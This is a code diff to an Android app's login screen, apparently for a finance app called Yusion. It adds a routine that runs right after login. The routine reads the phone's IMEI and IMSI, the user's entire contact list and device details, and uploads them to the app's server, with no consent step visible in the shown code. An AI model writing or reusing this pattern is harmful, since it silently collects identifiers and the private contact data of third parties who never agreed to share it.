@@ -4,6 +4,8 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.support.annotation.NonNull;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
 import android.widget.Button;
@@ -15,28 +17,50 @@ import com.yusion.shanghai.yusion.R;
 import com.yusion.shanghai.yusion.YusionApp;
 import com.yusion.shanghai.yusion.base.ActivityManager;
 import com.yusion.shanghai.yusion.base.BaseActivity;
+import com.yusion.shanghai.yusion.bean.auth.CheckUserInfoResp;
 import com.yusion.shanghai.yusion.bean.auth.LoginReq;
 import com.yusion.shanghai.yusion.bean.auth.LoginResp;
+import com.yusion.shanghai.yusion.bean.upload.ContactPersonInfoReq;
 import com.yusion.shanghai.yusion.retrofit.api.AuthApi;
 import com.yusion.shanghai.yusion.retrofit.api.ConfigApi;
+import com.yusion.shanghai.yusion.retrofit.api.PersonApi;
+import com.yusion.shanghai.yusion.retrofit.api.UploadApi;
+import com.yusion.shanghai.yusion.retrofit.callback.OnCodeAndMsgCallBack;
+import com.yusion.shanghai.yusion.retrofit.callback.OnItemDataCallBack;
+import com.yusion.shanghai.yusion.retrofit.service.UploadService;
 import com.yusion.shanghai.yusion.settings.Settings;
+import com.yusion.shanghai.yusion.ui.apply.VerificationCodeActivity;
 import com.yusion.shanghai.yusion.utils.CheckMobileUtil;
+import com.yusion.shanghai.yusion.utils.MobileDataUtil;
 import com.yusion.shanghai.yusion.utils.SharedPrefsUtil;
 import com.yusion.shanghai.yusion.widget.CountDownButtonWrap;
 
-public class LoginActivity extends BaseActivity {
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
+import java.util.ArrayList;
+import java.util.List;
+
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+
+public class LoginActivity extends BaseActivity {
+    public static final int READ_CONTACTS_CODE = 10;
     private EditText mLoginMobileTV;
     private EditText mLoginCodeTV;
     private Button mLoginCodeBtn;
     private Button mLoginSubmitBtn;
     private TextView mLoginAgreement;
     private CountDownButtonWrap mCountDownBtnWrap;
+    private TelephonyManager telephonyManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_login);
+        telephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
 
         ApplicationInfo applicationInfo = null;
         try {
@@ -79,6 +103,7 @@ public class LoginActivity extends BaseActivity {
             }
         });
         mLoginSubmitBtn.setOnClickListener(v -> {
+
 //            startActivity(new Intent(this, UploadLabelListActivity.class));
             if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
                 Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
@@ -112,8 +137,11 @@ public class LoginActivity extends BaseActivity {
             SharedPrefsUtil.getInstance(LoginActivity.this).putValue("token", YusionApp.TOKEN);
             SharedPrefsUtil.getInstance(LoginActivity.this).putValue("mobile", YusionApp.MOBILE);
             Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
-            startActivity(new Intent(LoginActivity.this, MainActivity.class));
-            finish();
+            //上传设备信息
+            uploadPersonAndDeviceInfo();
+
+//            startActivity(new Intent(LoginActivity.this, MainActivity.class));
+//            finish();
         }
     }
 
@@ -135,4 +163,66 @@ public class LoginActivity extends BaseActivity {
         //case 1:如果是从SettingActivity注销登录时，stack中有MainActivity和LoginActivity，所以退出应用需要先结束 MainActivity
         ActivityManager.finishOtherActivityEx(LoginActivity.class);
     }
+
+
+    private void uploadPersonAndDeviceInfo() {
+        ContactPersonInfoReq req = new ContactPersonInfoReq();
+        //TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId();
+        String imsi = telephonyManager.getSubscriberId();
+        req.imei = imei;
+        req.imsi = imsi;
+        req.app = "Yusion";
+
+        JSONArray jsonArray = MobileDataUtil.getUserData(this, "contact");
+        List<ContactPersonInfoReq.DataBean.ContactListBean> list = new ArrayList<>();
+        List<String> raw_list = new ArrayList<>();
+        for (int i = 0; i < jsonArray.length(); i++) {
+            JSONObject jsonObject = null;
+            try {
+                jsonObject = jsonArray.getJSONObject(i);
+                ContactPersonInfoReq.DataBean.ContactListBean contactListBean = new ContactPersonInfoReq.DataBean.ContactListBean();
+
+                contactListBean.data1 = jsonObject.optString("data1");
+                contactListBean.display_name = jsonObject.optString("display_name");
+
+                list.add(contactListBean);
+                raw_list.add(jsonObject.toString());
+
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+        if (list.size() > 0 && !list.isEmpty()) {
+            req.data.contact_list = list;
+        } else {
+            req.data.raw_data = raw_list;
+        }
+
+        req.data.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", "0");
+        req.system = "android";
+        JSONObject jsonArray1 = MobileDataUtil.getDeviceData(this);
+        req.brand = SharedPrefsUtil.getInstance(this).getValue("brand", "");
+        req.os_version = SharedPrefsUtil.getInstance(this).getValue("release", "");
+        req.factory = SharedPrefsUtil.getInstance(this).getValue("factory", "");
+        req.model = SharedPrefsUtil.getInstance(this).getValue("model", "");
+        req.data.action = "contact";
+
+        AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
+            @Override
+            public void onItemDataCallBack(CheckUserInfoResp data) {
+                req.data.clt_nm = data.name;
+                PersonApi.uploadPersonAndDeviceInfo(req);
+            }
+        });
+        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+        intent.putExtra("isNeedAgreement", true);
+
+        //startActivity(new Intent(LoginActivity.this, MainActivity.class));
+        startActivity(intent);
+        finish();
+        Toast.makeText(this, "成功", Toast.LENGTH_LONG).show();
+
+    }
+
 }
